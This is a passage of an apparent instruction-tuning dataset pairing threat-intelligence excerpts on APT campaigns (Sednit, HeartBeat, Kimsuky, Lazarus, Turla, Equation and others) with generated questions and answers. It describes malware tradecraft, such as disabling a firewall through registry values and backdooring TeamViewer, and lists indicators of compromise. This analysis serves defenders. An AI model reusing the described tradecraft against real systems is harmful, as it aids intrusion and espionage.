Leveraged By Tsar Team, , July 2015\n28. All-Ukrainian Academic Union, Contacts,\n29. The Huffington Post, Putin Is Being Pushed to Abandon His Conciliatory Approach to the West and Prepare for War,\n30. Palo Alto Networks Unit42, New Sofacy Attacks Against US Government Agency, , June 2016\n31. Wikipedia, Watering Hole,\n32. Stratfor, Geopolitical intelligence, economic, political, and military strategic forecasting,\n33. W3Schools Online Web Tutorials, The Navigator Object,\n34. W3Schools Online Web Tutorials, The Screen Object,\n35. MITRE, CVE-2013-1347,\n36. MITRE, CVE-2013-3897,\n37. MITRE, CVE-2014-1510,\n38. MITRE, CVE-2014-1511,\n39. MITRE, CVE-2014-1776,\n40. MITRE, CVE-2014-6332,\n41. BAE Systems, New Mac OS Malware Exploits MacKeeper, , June 2015\n42. MITRE, CVE-2015-2590,\n43. MITRE, CVE-2015-4902,\n44. Trend Micro, Analyzing the Pawn Storm Java Zero-Day \u2013 Old Techniques Reused, , July 2015\n45. MITRE, CVE-2015-3043,\n46. FireEye, Operation RussianDoll: Adobe & Windows Zero-Day Exploits Likely Leveraged by Russia's APT28 in Highly-Targeted Attack, , April 2015\n47. MITRE, CVE-2015-5119,\n48. ESET, Sednit APT Group Meets Hacking Team, , July 2015\n49. MITRE, CVE-2015-7645,\n50. Trend Micro, New Adobe Flash Zero-Day Used in Pawn Storm Campaign Targeting Foreign Affairs Ministries, , October 2015\n51. Security Intelligence, IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows,\n52. Trend Micro, A Killer Combo: Critical Vulnerability and 'Godmode' Exploitation on CVE-2014-6332,\n53. Yang Yu, Write Once, Pwn Anywhere, , BlackHat USA 2014\n54. F-Secure, Sofacy Recycles Carberp and Metasploit Code, , September 2015\n55. FireEye, Operation RussianDoll: Adobe & Windows Zero-Day Exploits Likely Leveraged by Russia's APT28 in Highly-Targeted Attack, , April 2015\n56. BAE Systems, New Mac OS Malware Exploits MacKeeper, , June 2015\n57. iSIGHTPARTNERS, Microsoft Office Zero-Day CVE-2015-2424 Leveraged By Tsar Team, , July 2015\n58. Palo Alto Networks Unit42, New Sofacy Attacks Against US Government Agency, , June 2016\n59. Microsoft Developer Network, RtlDecompressBuffer function,\n60. Microsoft Developer Network, Windows Integrity Mechanism Design,\n61. Microsoft Developer Network, Run-Time Type Information,\n62. PDB Files,\n63. MITRE, CVE-2015-1701,\n64. FireEye, Lessons from Operation RussianDoll, , March 2016\n65. MITRE, CVE-2015-2387,\n66. Microsoft Developer Network, Run and RunOnce Registry Keys,\n67. Stormshield, Poweliks \u2013 Command Line Confusion, , August 2014\n68. Stack Overflow, Rundll32.exe javascript,\n69. Microsoft Developer Network, COM Objects and Interfaces,\n70. Microsoft Developer Network, About MMDevice API,\n71. G DATA, COM Object hijacking: the discreet way of persistence, , October 2014\n72. Microsoft Developer Network, How to Implement Icon Overlay Handlers,\n73. CodeProject, Writing a BHO in Plain C++,\n74. Hexacorn Ltd, Beyond good ol' Run key, Part 18, , November 2014\n75. Internet Engineering Task Force, Dynamic Configuration of IPv4 Link-Local Addresses,\n76. Internet Engineering Task Force, HTTP Authentication: Basic and Digest Access Authentication,\n77. FireEye, CVE-2016-4117: Flash Zero-Day Exploited in the Wild, , May 2016\n78. MITRE, CVE-2016-4117,\n79. Redmine,\n\nHow did the Sednit group utilize Seduploader to bypass network security measures and ensure that only intended targets were infected?",
    "output": "A: The Sednit group utilized Seduploader as a first-stage malware to establish a network link between the compromised machine and the C&C server, effectively bypassing possible network security measures. Additionally, Seduploader was designed to verify that the infected computer belonged to an intended target, ensuring that security researchers were not among those infected. This was achieved through precise knowledge of the target's environment, often gained from previous infections within the same organization.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Attribution\nClues relating to the attackers remain very limited. Using compromised hosts as C&C proxy servers minimizes the possibility of tracking potential threat actors. While a number of their campaign codes included Chinese words such as guohui, xuehui and minzhu, they appear to be comfortable using the English language. Some of the C&C domain names even contained English words. In addition, the binder tool and the RAT component are written in English. For instance, some text from the packaged components' body included \"Select Files!\" and \"Bind Success!\", while the RAT component included strings such as \"Uninstall\u2026ok\" and the name of the RAT itself, \"HeartBeat.\"\nThreat actors and entities that use collected information from targets may be two separate parties that are only related in a professional and malicious manner. In this case, determining the latter may be impossible. Likewise, it is very difficult to identify the threat actors behind the HeartBeat campaign given the limited amount of information available.\nBig Headline: ConClusion\nThe Heartbeat campaign has been successfully executing targeted attacks since 2009. In order for attackers to properly track their campaigns and victims, they used campaign codes that contained the campaign dates and strings that described specific campaigns. These campaign codes are embedded in their RAT binaries and were sent to their C&C servers along with information regarding the targets' system. Additionally, they used a commercial site redirection service for their C&C domains. These domains redirected to various IP addresses that belonged to legitimate ISPs, which may be compromised hosts that act as proxy servers. This effectively hides the real location of the attackers behind HeartBeat. While having an isolated target may have helped them stay under the security industry's radar, the attackers illustrated that they were very careful but persistent.\nUnderstanding targeted campaigns and their methodologies is fundamental in protecting both end users and organizations. Not only does it help in coming up with effective defensive strategies through multiple protection layers, it also helps with predicting possible targets in the future and ultimately, raise awareness. As of this writing, the HeartBeat APT campaign remains an active targeted campaign.\nBig Headline: timeline\nWe collected 19 set of samples related to HeartBeat campaign from November 2009 to June 2012. This translates to 19 campaigns where the vast majority of which were distributed between 2011 and 2012. Nonetheless, the limited number of samples we were able to obtain still means that the campaign is indeed persistent. The isolated nature of this targeted attack and its small user base may only require the HeartBeat perpetrators to carry out minimal campaigns in order to infiltrate their targets.\nWe did not obtain a campaign sample from 2010. However, we highly suspect that their operation was also active during that year. In fact, we can see in the second MD5 above that the sample was compiled in December 24, 2010. Also, it is possible that some of the campaign's attacks may not have been escalated to antivirus firms by infected users, or simply remains undiscovered.\nBig Headline: defending AgAinst the heArtbeAt CAmPAign\nEssential components of defense against the HeartBeat campaign are security-related policies within enterprises. Once an attack is identified, a good cleanup strategy should focus on determining the attack vector and cutting off communications with the C&C server. It is also vital to determine the scope of the compromise and assessing the damage through data analysis and forensics.\nThe following best practices are also advised:\n\u2022 Disable services that are related to the HeartBeat RAT component.\n\u2022 Enable system's firewall\n\u2022 Keep software and operating systems updated with latest patches released by vendors to address vulnerabilities and exploits.\n\u2022 Block unused ports to disallow malware from using these ports to communicate and/or enforce commands.\n\u2022 Monitor network connections for any suspicious connection or connectivity.\n\u2022 Regularly update list of sites that are trusted.\n\u2022 Configure your email server to block or remove email\nthat contain file attachments using extensions such as .VBS, .BAT, .EXE, .PIF and .SCR files.\n\u2022 Avoid opening email attachments and clicking embedded links from unknown sources\n\u2022 Block any file with more than one file type extension.\n\u2022 When a computer is compromised, isolate it immediately from the network.\n\u2022 Configure your system to show hidden files and folders and display file extensions.\n\u2022 Don't save login credentials on the local computer.\nBig Headline: trend miCro threAt ProteCtion AgAinst the heArtbeAt CAmPAign ComPonents\nThe following table summarizes the Trend Micro solutions for the components of the HeartBeat campaign. Trend Micro recommends a comprehensive security risk management strategy that goes further than advanced protection to meet the real-time threat management requirements of dealing with targeted attacks.\nThe \"HeartBeat\" campaign has been persistently pursuing government agencies since 2009. The samples collected related to this campaign covered attacks seen from November 2009 to June 2012, although majority of the attacks were seen in 2011 and 2012.\n\u2022\t Victims\tand\tTargets\nAPT campaigns target specific industries or communities of interest in specific regions.\nThe HeartBeat campaign targets South Korean government organizations and institutions like political parties, media outfits, a national policy research institute, a military branch of South Korean armed forces, a small business sector organization, and branches of the South Korean government.\n\u2022\t Operations\nThe 1st-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\nThe threat actors behind HeartBeat install a RAT in system. The RAT arrives as a disguised or fake document which is actually a bundled file. The bundled file contains both a decoy document and the RAT installer that has been packaged together using a binder tool. The campaign's decoy documents used the file formats .JPG, .PDF, XLS, and HWP, the Korean government standard word processor format.\n\u2022\t Possible\tIndicators\tof\tCompromise\nAttackers want to remain undetected as long as possible. A key characteristic of these attacks is stealth.\nThe following indicators suggest an infection by the HeartBeat campaign: contiguous 02H bytes communication in the network, the presence of certain files and registries as detailed in the paper, and network connections to certain IPs and domains, including the presence of files detected as TROJ_DRPBEAT and BKDR_HBEAT.\n\u2022\t Relationship\twith\tother\tAPT\tCampaigns\nThis attack does not seem to have any relationship with other APT campaigns.\nMedium Headline: TREND MICRO INCORPORATED\nTrend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat management solutions for businesses and consumers. A pioneer in server security with over 20 years' experience, we deliver top-ranked client, server and cloud-based security that fits our customers' and partners' needs, stops new threats faster, and protects data in physical, virtualized and cloud environments. Powered by the industry-leading Trend Micro\u2122 Smart Protection Network\u2122 cloud computing security infrastructure, our products and services stop threats where they emerge\u2014from the Internet. They are supported by 1,000+ threat intelligence experts around the globe.\nQ: How did the HeartBeat campaign utilize campaign codes to manage and track their operations? What information was embedded in these codes and how were they transmitted?",
    "output": "The HeartBeat campaign utilized campaign codes to manage and track their operations. These campaign codes contained the campaign dates and strings that described specific campaigns. The codes were embedded in their RAT (Remote Access Trojan) binaries and were sent to their C&C (Command and Control) servers along with information regarding the targets' system. This approach allowed the attackers to effectively monitor and control their campaigns, ensuring they could track the progress and impact of each attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Remote control module downloader\nAn extra program is dedicated exclusively to download attachments out of incoming e-mails with a particular subject tag. This program is similar to the pivot module but with reduced functionality: it maintains the hardcoded Bulgarian e-mail account, logs in, reads incoming e-mails and searches for the special subject tag \"Team\". When found, it loads the related attachment, drops it onto the hard drive as C:Program FilesCommon FilesSystemOle DBtaskmgr.exe and executes. This particular executable arrives without any encryption.\nBig Headline: Remote control module\nIt is also interesting that the malware author did not custom develop a backdoor program. Instead, the author modified TeamViewer client version 5.0.9104. The initial executable pushed by attackers in e-mails related to the remote control module consists of three more executables. Two of them are Team Viewer components themselves, and another is some sort of backdoor loader. So, the dropper creates three files in the C:WindowsSystem32 directory:\nnetsvcs.exe - the modified Team Viewer client; netsvcs_ko.dll - resources library of Team Viewer client; vcmon.exe - installer/starter;\nand creates the service \"Remote Access Service\", adjusted to execute C:WindowsSystem32vcmon.exe at\nsystem startup. Every time the vcmon.exe is executed, it disables AhnLab's firewall by zeroing out following registry values:\nHKLMSOFTWAREAhnLabV3 365 ClinicInternetSec\nThen, it modifies the Team Viewer registry settings. As we said, the Team Viewer components used in this campaign are not the original ones. They are slightly modified. In total, we found two different variants of changed versions. The malware author replaced all the entries of \"Teamviewer\" strings in Team Viewer components. In the first case with the \"Goldstager\" string and with the string \"Coinstager\" in the second. TeamViewer client registry settings are then HKLMSoftwareGoldstagerVersion5 and HKLMSoftwareCoinstagerVersion5 correspondingly. The launcher sets up several registry values that control how the remote access tool will work. Among them is SecurityPasswordAES. This parameter represents a hash of the password with which a remote user has to connect to Team Viewer client. This way, the attackers set a pre-shared authentication value. After that, the starter executes the very Team Viewer client netsvcs.exe.\nBig Headline: Who's Kim?\nIt's interesting that the drop box mail accounts iop110112@hotmail.com and rsh1213@hotmail.com are registered with the following \"kim\" names: kimsukyang and \"Kim asdfa\".\nOf course, we can't be certain that these are the real names of the attackers. However, the selection isn't frequently seen. Perhaps it also points to the suspected North Korean origin of attack. Taking into account the profiles of the targeted organizations -- South Korean universities that conduct researches on international affairs, produce defense policies for government, national shipping company, supporting groups for Korean unification -- one might easily suspect that the attackers might be from North Korea.\nThe targets almost perfectly fall into their sphere of interest. On the other hand, it is not that hard to enter arbitrary registration information and misdirect investigators to an obvious North Korean origin. It does not cost anything to concoct fake registration data and enter kimsukyang during a Hotmail registration. We concede that this registration data does not provide concrete, indisputable information about the attackers.\nHowever, the attackers' IP-addresses do provide some additional clues. During our analysis, we observed ten IP-addresses used by the Kimsuky operators. All of them lie in ranges of the Jilin Province Network and Liaoning Province Network, in China.\nNo other IP-addresses have been uncovered that would point to the attackers' activity and belong to other IP-ranges. Interestingly, the ISPs providing internet access in these provinces are also believed to maintain lines into North Korea. Finally, this geo-location supports the likely theory that the attackers behind Kimsuky are based in North Korea.\nBig Headline: Appendix\nFiles used by malware:\n%windir%system32kbdlv2.dll\n%windir%system32auto.dll\n%windir%system32netsvcs.exe\n%windir%system32netsvcs_ko.dll\n%windir%system32vcmon.exe\n%windir%system32svcsmon.exe\n%windir%system32svcsmon_ko.dll\n%windir%system32wsmss.exe\n%temp%~DFE8B437DD7C417A6D.TMP\n%temp%~DFE8B43.TMP\n%temp%~tmp.dll\nC:Windowstaskmgr.exe\nC:Windowssetup.log\nC:Windowswinlog. txt\nC:Windowsupdate.log\nC:Windowswmdns.log\nC:Windowsoledvbs.inc\nC:Windowsweoig.log\nC:Windowsdata.dat\nC:Windowssys.log\nC:WindowsPcMon. exe\nC: WindowsGoogle Update.exe\nC:WindowsReadMe. log\nC:Windowsmsdatt. bat\nC:Windowsmsdatl3. inc\nC: Program FilesCommon FilesSystemOle DBmsdmeng.cnt\nC: Program FilesCommon FilesSystemOle DBxmlrwbin.inc\nC: Program FilesCommon FilesSystemOle DBmsdapml.cnt\nC: Program FilesCommon FilesSystemOle DBsqlsoldb.exe\nC: Program FilesCommon FilesSystemOle DBoledjvs.inc\nC: Program FilesCommon FilesSystemOle DBoledvbs.inc\nC: Program FilesCommon FilesSystemOle DBmsolui80.inc\nC: Program FilesCommon FilesSystemOle DBmsdaipp.cnt\nC: Program FilesCommon FilesSystemOle DBmsdaerr.cnt\nC: Program FilesCommon FilesSystemOle DBsqlxmlx.inc\n<Hangul full path>HncReporter.exe\nRelated MD5:\n3baaf1a873304d2d607dbedf47d3e2b4\n3195202066f026de3abfe2f966c9b304\n4839370628678f0afe3e6875af010839\n173c1528dc6364c44e887a6c9bd3e07c        191d2da5da0e37a3bb3cbca830a405ff        5eef25dc875cfcb441b993f7de8c9805\nb20c5db37bda0db8eb1af8fc6e51e703         face9e96058d8fe9750d26dd1dd35876\n9f7faf77b1a2918ddf6b1ef344ae199d        d0af6b8bdc4766d1393722d2e67a657b        45448a53ec3db51818f57396be41f34f        80cba157c1cd8ea205007ce7b64e0c2a        f68fa3d8886ef77e623e5d94e7db7e6c        4a1ac739cd2ca21ad656eaade01a3182        4ea3958f941de606a1ffc527eec6963f        637e0c6d18b4238ca3f85bcaec191291        b3caca978b75badffd965a88e08246b0        dbedadc1663abff34ea4bdc3a4e03f70        3ae894917b1d8e4833688571a0573de4        8a85bd84c4d779bf62ff257d1d5ab88b        d94f7a8e6b5d7fc239690a7e65ec1778        f1389f2151dc35f05901aba4e5e473c7        96280f3f9fd8bdbe60a23fa621b85ab6        f25c6f40340fcde742018012ea9451e0        122c523a383034a5baef2362cad53d57        2173bbaea113e0c01722ff8bc2950b28        2a0b18fa0887bb014a344dc336ccdc8c        ffad0446f46d985660ce1337c9d5eaa2        81b484d3c5c347dc94e611bae3a636a3        ab73b1395938c48d62b7eeb5c9f3409d        69930320259ea525844d910a58285e15\nNames of services created by malware:\nDriverManage\nWebService\nWebClientManager\nRemote Access Service\nWe detect these threats as Trojan.Win32.Kimsuky except modified Team Viewer client components which are detected as Trojan.Win32.Patched.ps.\n\nHow does the Kimsuky operation utilize the TeamViewer software for remote control, and what modifications were made to the original software?",
    "output": "A: The Kimsuky operation utilizes a modified version of TeamViewer client version 5.0.9104 for remote control. The malware author modified the TeamViewer components by replacing all instances of 'Teamviewer' strings with either 'Goldstager' or 'Coinstager'. The dropper creates three files in the C:\\\\Windows\\\\System32 directory: netsvcs.exe (the modified Team Viewer client), netsvcs_ko.dll (resources library of Team Viewer client), and vcmon.exe (installer/starter). It also creates a service called 'Remote Access Service' to execute vcmon.exe at system startup. Additionally, the malware disables AhnLab's firewall by zeroing out specific registry values and modifies Team Viewer registry settings to set a pre-shared authentication value.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did Lazarus demonstrate its capability to attack all major operating systems, and what was the significance of the discovery of the SimpleTea code base?",
    "output": "Lazarus demonstrated its capability to attack all major operating systems by using macOS payloads against its targets. Samples of SimpleTea for macOS were uploaded to VirusTotal from Hong Kong and China, and a macOS WebbyTea downloader was discovered. The associated Python loader has code to pick a payload according to the OS it is executed on: Windows, Linux, or Darwin (the core Unix system of macOS). The discovery of the SimpleTea code base was significant because it revealed that the code used to compile the SimplexTea Linux backdoor was part of a common Lazarus code base used for all major desktop platforms. This commonality led to the decision to use the SimpleTea name for all malware derived from this common code base, highlighting Lazarus's versatility and broad targeting capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Introduction\nKaspersky Lab has always worked closely with vendors to protect users. As soon as we find new vulnerabilities we immediately inform the vendor in a responsible manner and provide all the details required for a fix.\nOn October 10, 2017, Kaspersky Lab's advanced exploit prevention systems identified a new Adobe Flash zero day exploit used in the wild against our customers. The exploit was delivered through a Microsoft Office document and the final payload was the latest version of FinSpy malware. We have reported the bug to Adobe who assigned it (<https://helpx.adobe.com/security/products/flash-player/apsb17-32.html>)CVE-2017-11292 and released a patch earlier today:\nSo far only one attack has been observed in our customer base, leading us to believe the number of attacks are minimal and highly targeted.\nAnalysis of the payload allowed us to confidently link this attack to an actor we track as \"BlackOasis\". We are also highly confident that BlackOasis was also responsible for another zero day exploit (CVE-2017-8759) discovered by (<https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html>)FireEye in September 2017. The FinSpy payload used in the current attacks (CVE-2017-11292) shares the same command and control (C2) server as the payload used with CVE-2017-8759 uncovered by FireEye.\n\nHow did Kaspersky Lab identify the involvement of the 'BlackOasis' APT group in the exploitation of the Adobe Flash zero-day vulnerability (CVE-2017-11292), and what specific indicators led them to link this attack to another zero-day exploit (CVE-2017-8759) discovered by FireEye?",
    "output": "Kaspersky Lab identified the involvement of the 'BlackOasis' APT group in the exploitation of the Adobe Flash zero-day vulnerability (CVE-2017-11292) through analysis of the payload used in the attack. The payload was found to be the latest version of FinSpy malware. This analysis allowed Kaspersky to confidently attribute the attack to 'BlackOasis'. Additionally, the FinSpy payload used in the current attacks shared the same command and control (C2) server as the payload used with CVE-2017-8759, which was previously uncovered by FireEye. This commonality in the C2 infrastructure provided strong evidence linking both zero-day exploits to the 'BlackOasis' group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 5 Conclusion\nThe global internet offers military and intelligence agencies the opportunity to expand and enhance IW, and it simultaneously presents their targets and victims with novel challenges. Russian IW \u2013 both in traditional media and in cyberspace \u2013 tangibly contributed to the successful annexation of Crimea, and is playing an important role in the ongoing crisis in eastern Ukraine. On balance, this author believes that Russia, and not the West, currently has the lead in contemporary IW.\nUnlike propaganda in Soviet times, which was largely a unidirectional, top-down phenomenon, today's IW encompasses a worldwide audience that is both narrative-bearing and narrative-developing. Domestic, diaspora, and foreign audiences interact with current events in real time as they travel through online platforms such as social media. This dynamic makes it more challenging for propagandists to predict how and where the narrative will evolve, but to some degree it is possible to presume how certain political groups will interpret the narrative and how they will describe it to their followers.\nIn sum, the traditional 'fog of war' has changed in the internet era. The ubiquity and anonymity of internet communications offer all nations including Russia\n46 Markku Lonkila. 'Russian Protest On-and Offline: The role of social media in the Moscow opposition demonstrations in December 2011.' UPI FIIA Briefing Papers 98, 2012.\nIn sum, the traditional 'fog of war' has changed in the internet era.\nnew IW opportunities, even as defenders also have more tools and tactics at their disposal to counter hostile actions. In Ukraine, 'conventional' cyber attacks by Russia were negligible,47 but social media-based, narrative-focused attacks including disinformation have been common. And while it is possible to counter adversary operations with accurate open source analysis (for journalists,48 scholars, and activists49), this is unfortunately difficult to do in a timely manner.\n47 However, even unsophisticated cyber attacks such as DDoS and website defacements tend to garner widespread media exposure, and can sow distrust in the security of systems. This occurred during the invasion of Crimea, when Russia sought to capitalise on events that unfolded far too quickly for methodical information analysis to take place.\n48 Jessikka Aro.'Yle Kioski Investigated: This is How Pro-Russia Trolls Manipulate Finns Online \u2013 Check the List of Forums Favored by Propagandists'. YLE Kioski, 24 June 2015. (<http://kioski.yle.fi/omat/troll-piece-2-english>)http://kioski.yle.fi/omat/troll-piece-2-english.\n49 Sites such as www.stopfake.org were launched inviting people to join the 'struggle against fake information about events in Ukraine' by verifying online allegations. 'Stopfake.org.' 2015. Accessed: 14 June 2015. (<http://www.stopfake.org>)http://www.stopfake.org; 'Bellingcat kontert Kritik mit neuen Satellitenbildern'. Zeit Online. 12 June 2015. (<http://www.zeit.de/politik/ausland/2015-06/bellingcat-russland-mh17-satellitenfotos-manipulation>)www.zeit.de/politik/ausland/2015-06/bellingcat-russ-(<http://www.zeit.de/politik/ausland/2015-06/bellingcat-russland-mh17-satellitenfotos-manipulation>)land-mh17-satellitenfotos-manipulation; Dmitry Volchek and Claire Bigg. 'Ukrainian bloggers use social media to track Russian soldiers fighting in east'. The Guardian, 3 June 2015. (<http://www.theguardian.com/world/2015/jun/03/bloggers-social-media-russian-soldiers-fighting-in-ukraine>)http://www.theguardian.com/world/2015/jun/03/bloggers-social-(<http://www.theguardian.com/world/2015/jun/03/bloggers-social-media-russian-soldiers-fighting-in-ukraine>)media-russian-soldiers-fighting-in-ukraine.\nSmall Headline: 1 Introduction\nIn the Russo-Ukrainian conflict, there has been much talk of 'hybrid warfare', encompassing every aspect of war including cyber operations. Much of cyber operations is classified and hidden from public view, but there are numerous ways in which information becomes known, including via intelligence leaks and open source analysis. This chapter focuses on leadership communications and what they can tell us about conflict in cyberspace.\nIn geopolitics, heads of state are the ultimate decision-makers, especially during a national security crisis. Leaders are expected to show rhetorical as well as executive leadership. The media takes it from there, but the public still struggles to find a consistent evaluation, primarily relying on experts and opinion leaders.1 As the head of state seeks his or her 'rally around the president' moment,2 domestic and international observers analyse their explanations and emotions \u2013 as well as their proffered initiatives and guidance.3 From a national podium, heads of state have an inherent advantage, as their arguments are 'more likely to resonate with the public than the opinions of leaders voicing a more local outlook'. 4\nCommunication and discourse analysis in international affairs rests on the idea that language cannot be taken at face value. Words carry definitional meaning, but dif-\nferent audiences will perceive them differently. Critical analysis can yield insight into the true beliefs and motivations of any speaker, including policy-makers. Meaning is 'mediated through language'5 and all words have 'social values'6 that vary with context.\n1 Timothy E Cook. Governing with the News (Chicago and London: University of Chicago Press, 1998).\n2 Birgitte Lebens Nacos. Terrorism and the Media: From the Iran Hostage Crisis to the Oklahoma City Bombing (New York: Columbia University Press, 1996).\n3 Jeffrey E Cohen. Presidential Responsiveness and Public Policy-Making, The Public and the Policies That Presidents Choose (Ann Arbor: The University of Michigan Press, 1997).\n4 Ibid, 32.\nThis chapter analyses Russian and Ukrainian leadership statements, speeches, press releases and other rhetoric from 2014 and 2015, especially the English-language elements, written for a global audience and printed in international media. The author also searched major international news outlets for the keywords 'Ukraine', 'Russia', 'cyber', and 'information warfare'. In all cases, focus remained on the rhetoric attributable to a head of state or other high-level political player,7 with an eye toward uncovering their underlying motivations, beliefs, and ideologies.\nSmall Headline: 2 Analytical Focus\nThis analysis is designed to yield insight into numerous areas of international concern. Above all, the world would like to understand more about the emerging threat of cyber warfare. New developments in research and technology, as well as in the means and methods of war, are usually far ahead of their codification in doctrine.\nAn analysis of political rhetoric may yield significant insight into what politicians cannot discuss in public forums.\nComputer network operations fit nicely within the concept of hybrid warfare that has been so characteristic of the Russo-Ukrainian conflict. Cyber attacks are similar to covert operations, information operations, denial and deception, false flag and no-flag attacks: they give national command and control structures some degree of plausible deni-ability. These aspects of war tend to be highly classified; therefore, an analysis of political rhetoric may yield significant insight into what politicians, soldiers and spies simply cannot discuss in public forums, namely, one of the most vexing challenges of cyber attacks: attribution.\nPolitical leaders must appeal to the hearts and minds of their domestic and international audiences, with the help of emotional and sometimes long-winded speeches. National security establishments must provide legal support for their actions through the release of press statements and promulgation of doctrine. With these in hand, analysts may be able to understand much more about the otherwise covert nature of cyber attacks. In 2015, Russia has a fairly well-developed military doctrine on cyber and information warfare, while that of Ukraine is still in its infancy. This analysis offers a deeper understanding of each nation's non-explicit political objectives related to cyber warfare.\n5 Henrik Larsen. Foreign Policy and Discourse Analysis: France, Britain and Europe (London: Routledge advances in International Relations and Politics, 1997), 11.\n6 Ibid, 14.\n7 Unfortunately, on the current 'President of Ukraine' website, documents and speeches by former Ukrainian President Viktor Yanukovych cannot be found.\nQ: How does the analysis of leadership communications provide insights into the covert nature of cyber attacks, and what specific aspects of cyber warfare can be understood through this method?",
    "output": "The analysis of leadership communications, such as speeches, press releases, and other rhetoric, can provide significant insights into the covert nature of cyber attacks. By examining the language and underlying motivations of political leaders, analysts can gain a deeper understanding of otherwise classified aspects of cyber warfare. Specifically, this method can shed light on the attribution of cyber attacks, which is one of the most vexing challenges in this domain. Political leaders often use emotional and long-winded speeches to appeal to their audiences, and national security establishments release press statements and doctrine to provide legal support for their actions. These communications can reveal non-explicit political objectives related to cyber warfare.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 2:45pm EST\nBy Peter Apps and Jim Finkle\nLONDON/BOSTON (Reuters) -\u00adA sophisticated piece of spyware has been quietly infecting hundreds of government computers across Europe and the United States in one of the most complex cyber espionage programs uncovered to date.\nSeveral security researchers and Western intelligence officers say they believe the malware, widely known as Turla, is the work of the Russian government and linked to the same software used to launch a massive breach on the U.S. military uncovered in 2008.\nIt was also linked to a previously known, massive global cyber spying operation dubbed Red October targeting diplomatic, military and nuclear research networks.\nThose assessments were based on analysis of tactics employed by hackers, along with technical indicators and the victims they targeted.\n\"It is sophisticated malware that's linked to other Russian exploits, uses encryption and targets western governments. It has Russian paw prints all over it,\" said Jim Lewis, a former U.S. foreign service officer, now senior fellow at the Center for Strategic and International Studies in Washington.\nHowever, security experts caution that while the case for saying Turla looks Russian may be strong, it is impossible to confirm those suspicions unless Moscow claims responsibility. Developers often use techniques to cloud their identity.\nThe threat surfaced this week after a little known German anti-\u00advirus firm, G Data, published a report on the virus, which it called Uroburos, the name text in the code that may be a reference to the Greek symbol of a serpent eating its own tail.\nExperts in state-\u00adsponsored cyber attacks say that Russian government-\u00adbacked hackers are known for being highly disciplined, adept at hiding their tracks, extremely effective at maintaining control of infected networks and more selective in choosing targets than their Chinese counterparts.\n\"They know that most people don't have either the technical knowledge or the fortitude to win a battle with them. When they recognize that someone is onto them, they just go dormant,\" said one expert who helps victims of state-\u00adsponsored hacking.\nA former Western intelligence official commented: \"They can draw on some very high grade programmers and engineers, including the many who work for organized criminal groups, but also function as privateers.\"\nRussia's Federal Security Bureau declined comment as did Pentagon and U.S. Department of Homeland Security officials.\nOn Friday, Britain's BAE Systems Applied Intelligence -\u00adthe cyber arm of Britain's premier defense contractor -\u00adpublished its own research on the spyware, which it called \"snake.\"\nThe sheer sophistication of the software, it said, went well beyond that previously encountered -\u00adalthough it did not attribute blame for the attack.\n\"The threat... really does raise the bar in terms of what potential targets, and the security community in general, have to do to keep ahead of cyber attacks,\" said Martin Sutherland, managing director of BAE Systems Applied Intelligence.\n\nHow do the tactics and characteristics of Russian government-backed hackers differ from those of their Chinese counterparts, according to experts in state-sponsored cyber attacks?",
    "output": "A: According to experts in state-sponsored cyber attacks, Russian government-backed hackers are known for being highly disciplined and adept at hiding their tracks. They are extremely effective at maintaining control of infected networks and are more selective in choosing their targets compared to their Chinese counterparts. When recognized, these hackers tend to go dormant rather than engage in a direct confrontation. They also have access to high-grade programmers and engineers, including those who work for organized criminal groups but function as privateers. This combination of discipline, stealth, and selectivity sets them apart from other state-sponsored hacking groups.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT41's targeting of high-tech firms align with China's national strategies, and what specific industries and technologies have been targeted?",
    "output": "APT41's targeting of high-tech firms aligns with China's national strategies, particularly the 'Made in China 2025' initiative, which aims to shift China's economy towards higher value products and services. Specifically, APT41 has targeted organizations involved in the research, development, and sale of computer components used for machine-learning, autonomous vehicles, medical imaging, and the consumer market. Additionally, the group has targeted companies producing motherboards, processors, and server solutions for enterprises. For example, in April 2013, APT41 targeted an enterprise cloud-computing provider, which was a goal in the 12th Five-Year Plan.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 14. What C&C infrastructure do the Equation group implants use?\nThe Equation group uses a vast C&C infrastructure that includes more than 300 domains and more than 100 servers. The servers are hosted in multiple countries, including the US, UK, Italy, Germany, Netherlands, Panama, Costa Rica, Malaysia, Colombia and Czech Republic.\nAll C&C domains appear to have been registered through the same two major registrars, using \"Domains By Proxy\" to mask the registrant's information.\nKaspersky Lab is currently sinkholing a couple dozen of the 300 C&C servers.\nBig Headline: 15. How do victims get selected for infection by the EQUATION group?\nThe EQUATION group sometimes selects its victims with surgical precision. When precision is not possible, the victims are targeted by a validator (DOUBLEFANTASY) implant and subsequently disinfected if they do not appear to be \"interesting\" to the attackers.\nHere are some web-based targeting examples from the Equation group:\nOn March 2, 2013, a Kaspersky Lab user browsing an online forum was attacked with an exploit from one of the Equation group's exploitation servers:\nThe attack was unsuccessful as it was caught by our product and the user was protected. The attack was targeting Firefox 17 (TOR Browser), using an unknown exploit that we have not recovered.\nLooking further, we identified a few other known Equation servers used in similar attacks even earlier:\n2012-12-11 \u2013 technology-revealed[.]com/diagram/navigate.html?overlay=AL[snip]OISn6sI1&sn=d1[SNIP]dd\nThese attacks were delivered in several ways \u2013 for example, while the user visited a number of Islamic Jihadist discussion forums, or via advertisements on popular websites in the Middle East.\nThe forums in question appear to have been compromised by a specific PHP script that exploited only authenticated visitors. We were able to obtain one of these PHP scripts embedded in a discussion forum:\nMalicious PHP script injected into hacked discussion forums\nThis PHP script provides a multitude of interesting information about the attacks. It was first designed to work as part of vBulletin, a commercial forum platform. It specifically checks if the visitor's username MD5 matches two 